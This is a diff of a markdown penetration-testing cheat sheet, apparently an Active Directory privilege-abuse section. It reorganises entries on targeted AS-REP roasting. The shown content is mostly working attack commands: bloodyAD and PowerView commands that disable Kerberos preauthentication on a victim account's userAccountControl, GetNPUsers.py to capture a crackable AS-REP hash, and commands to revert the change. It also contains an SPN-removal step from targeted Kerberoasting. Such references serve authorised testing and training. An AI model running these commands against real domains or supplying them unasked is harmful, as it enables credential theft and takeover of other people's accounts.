@@ -67,6 +67,20 @@ We can set a **SPN** on a target account, request a Service Ticket (ST), then gr
   # Remove the SPN
   bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname
   ```
+* **We can change a victim's **userAccountControl** to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.**  
+
+* Windows/Linux:
+
+  ```ps1
+  # Modify the userAccountControl
+  $ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] add uac [Target_User] -f DONT_REQ_PREAUTH
+
+  # Grab the ticket
+  $ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+
+  # Set back the userAccountControl
+  $ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] remove uac [Target_User] -f DONT_REQ_PREAUTH
+  ```
 
 ### From Windows
 * **Using Powerview**  
@@ -107,24 +121,10 @@ We can set a **SPN** on a target account, request a Service Ticket (ST), then gr
   $Cred2 = New-Object System.Management.Automation.PSCredential(<domain\username'>, $TargetPass)
   ```
 
-We can change a victim's **userAccountControl** to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.
+* **We can change a victim's **userAccountControl** to not require Kerberos preauthentication, grab the user's crackable AS-REP, and then change the setting back.**  
 
-* Windows/Linux:
-
-  ```ps1
-  # Modify the userAccountControl
-  $ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] add uac [Target_User] -f DONT_REQ_PREAUTH
-
-  # Grab the ticket
-  $ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
-
-  # Set back the userAccountControl
-  $ bloodyAD --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] remove uac [Target_User] -f DONT_REQ_PREAUTH
-  ```
-
-* Windows only:
-
-  ```ps1
+* Windows
+  ```powershell
   # Modify the userAccountControl
   PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
   PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
